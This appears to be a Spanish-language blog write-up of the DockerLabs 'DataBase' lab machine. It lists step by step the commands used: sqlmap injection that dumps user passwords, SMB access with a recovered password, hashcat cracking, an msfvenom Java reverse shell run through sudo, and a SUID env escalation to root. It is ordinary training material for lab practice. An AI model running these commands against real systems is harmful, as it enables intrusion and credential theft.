<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset='utf-8'>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="/assets/css/style.css?v=5fdc73dbc748710b5d954669c64acfd639531df9">
    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->

<!-- Setup theme-color -->
<!-- start theme color meta headers -->
<meta name="theme-color" content="#151515">
<meta name="msapplication-navbutton-color" content="#151515">
<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
<!-- end theme color meta headers -->


<!-- Setup Google Analytics -->



<!-- You can set your favicon here -->
<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->

<!-- end custom head snippets -->


<!-- Begin Jekyll SEO tag v2.8.0 -->
<title>DataBase |DockerLabs</title>
<meta name="generator" content="Jekyll v3.10.0" />
<meta property="og:title" content="DataBase" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Aquí va el contenido de tu entrada de blog. Puedes usar Markdown para formatear el texto, como en este ejemplo." />
<meta property="og:description" content="Aquí va el contenido de tu entrada de blog. Puedes usar Markdown para formatear el texto, como en este ejemplo." />
<link rel="canonical" href="http://localhost:4000/pentesting/2024/12/03/mi-nota.md-Database.html" />
<meta property="og:url" content="http://localhost:4000/pentesting/2024/12/03/mi-nota.md-Database.html" />
<meta property="og:site_name" content="Mi Sitio Hacker" />
<meta property="og:image" content="http://localhost:4000/assets/images/imagen.jpg" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2024-12-03T00:00:00-05:00" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:image" content="http://localhost:4000/assets/images/imagen.jpg" />
<meta property="twitter:title" content="DataBase" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2024-12-03T00:00:00-05:00","datePublished":"2024-12-03T00:00:00-05:00","description":"Aquí va el contenido de tu entrada de blog. Puedes usar Markdown para formatear el texto, como en este ejemplo.","headline":"DataBase","image":"http://localhost:4000/assets/images/imagen.jpg","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/pentesting/2024/12/03/mi-nota.md-Database.html"},"url":"http://localhost:4000/pentesting/2024/12/03/mi-nota.md-Database.html"}</script>
<!-- End Jekyll SEO tag -->

  </head>

  <body>

    <header>
      <div class="container">
        <a id="a-title" href="/">
          <h1>DockerLabs</h1>
        </a>
        <h2></h2>

        <section id="downloads">
          
          <a href="https://github.com/kamilfire/kamilfire.github.io" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
        </section>
      </div>
    </header>

    <div class="container">
      <section id="main_content">
        <small>3 December 2024</small>
<h1>DataBase</h1>



<p>Aquí va el contenido de tu entrada de blog. Puedes usar Markdown para formatear el texto, como en este ejemplo.</p>

<p>iniciamos la maquina</p>

<p><img src="/imagenes/pasted_image_20241129171203.png" alt="Descripción de la imagen" /></p>

<p>escaneamos puertos con nmap  <code class="language-plaintext highlighter-rouge">nmap -p- --open -sCSV -vvv -Pn -n --min-rate 5000 172.17.0.2</code></p>

<p><img src="/imagenes/Pasted%20image%2020241129171313.png" alt="[Pasted image 20241129171313.png]" /></p>

<p>entramos a la dirrecion desde el navegador</p>

<p><img src="/imagenes/Pasted%20image%20241129171346.png" alt="[Pasted image 20241129171346.png]" /></p>

<p>buscamos si el login tiene alguna vulneravilidad sql <code class="language-plaintext highlighter-rouge">sqlmap -u http://172.17.0.2:80/index.php --dbs --forms</code></p>

<p><img src="/imagenes/Pasted%20image%2020241129171558.png" alt="[Pasted image 20241129171558.png]" /></p>

<p>encontramos bases de datos que exploraremos 
 <code class="language-plaintext highlighter-rouge">sqlmap -u http://172.17.0.2:80/index.php  --forms -D register --tables</code></p>

<p><img src="/imagenes/Pasted%20image%2020241129171705.png" alt="[Pasted image 20241129171705.png]" /></p>

<p><code class="language-plaintext highlighter-rouge">sqlmap -u http://172.17.0.2:80/index.php  --forms -D register --tables -T users --columns --batch</code></p>

<p><img src="/imagenes/Pasted%20image%202024112917182.png" alt="[Pasted image 20241129171823.png]" /></p>

<p><code class="language-plaintext highlighter-rouge">sqlmap -u http://172.17.0.2:80/index.php  --forms -D register --tables -T users --columns -C username,passwd --batch --dump</code></p>

<p><img src="/imagenes/Pasted%20image%2020241129171940.png" alt="[Pasted image 20241129171940.png]" /></p>

<p>con las credenciales encontradas probamos en el login</p>

<p><img src="/imagenes/Pasted%20image%2020241129172039.png" alt="[Pasted image 20241129172039.png]" /></p>

<p>en nmap observamos que esta base de datos corria en samba asi que hacemos uso de smbmap <code class="language-plaintext highlighter-rouge">smbmap -H 172.17.0.2 -u 'dylan' -p 'KJSDFG789FGSDF78'</code></p>

<p><img src="/imagenes/Pasted%20image%2020241129172223.png" alt="[Pasted image 20241129172223.png]" /></p>

<p>tenemos permisos de lectura y escritura en shared <code class="language-plaintext highlighter-rouge">smbclient -U 'dylan' //172.17.0.2/shared</code></p>

<p><img src="/imagenes/Pasted%20image%2020241129172319.png" alt="[Pasted image 20241129172319.png]" /></p>

<p>con el comando get descargamos el archivo txt que encontramos de nombre augustus,txt</p>

<p><img src="/imagenes/Pasted%20image%2020241129172409.png" alt="[Pasted image 20241129172409.png]" /></p>

<p>vemos que es un tipo de hash procedemos a identificar y decifrar</p>

<p><img src="/imagenes/Pasted%20image%2020241129172508.png" alt="[Pasted image 20241129172508.png]" /></p>

<p><code class="language-plaintext highlighter-rouge">echo "061fba5bdfc076bb7362616668de87c8" &gt; hashes.txt   ---  hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt</code></p>

<p><img src="/imagenes/Pasted%20image%2020241129172730.png" alt="[Pasted image 20241129172730.png]" /></p>

<p>entramos mediante ssh con el usuario augustus y la contrasena obtenida  <code class="language-plaintext highlighter-rouge">ssh -p22 augustus@172.17.0.2</code></p>

<p><img src="/imagenes/Pasted%20image%2020241129172918.png" alt="[Pasted image 20241129172918.png]" /></p>

<p>usamos msfvenom para hacernos una revershell ya que el usuario dylan puede ejecutar codigo java 
 <code class="language-plaintext highlighter-rouge">msfvenom -p java/shell_reverse_tcp LHOST=&lt;tu-ip&gt; LPORT=4444 -f jar -o shell.jar</code>
 nos colocamos en escucha y luego ejecutamos nuestro archivo desde el usuario augustus</p>

<p><img src="/imagenes/Pasted%20image%2020241129173148.png" alt="[Pasted image 20241129173148.png]" /></p>

<p>con este comando subes tu archivo jar a la maquina victima <code class="language-plaintext highlighter-rouge">scp &lt;archivo&gt; augustus@172.17.0.2:/tmp</code> luego ejecutas <code class="language-plaintext highlighter-rouge">sudo -u dylan /usr/bin/java -jar /tmp/shell.jar</code></p>

<p><img src="/imagenes/Pasted%20image%2020241129173519.png" alt="[Pasted image 20241129173519.png]" /></p>

<p>le das tratamiento a la tty para tener la interfaz dylan <code class="language-plaintext highlighter-rouge">script /dev/null -c bash</code>
 luego para buscar los recursos que ejecuta el usuario  <code class="language-plaintext highlighter-rouge">find / -perm -4000 2&gt;/dev/null</code>
 ya puedes observar que tienes permiso en la ruta env <code class="language-plaintext highlighter-rouge">/usr/bin/env /bin/sh -p</code>
 y listo eres root</p>

<p><img src="/imagenes/Pasted%20image%2020241129173801.png" alt="[Pasted image 20241129173801.png]" /></p>



<h2>About</h2>
  <a href="mailto:kamildeluq@gmail.com">kamildeluq@gmail.com</a>


      </section>
    </div>
  </body>
</html>
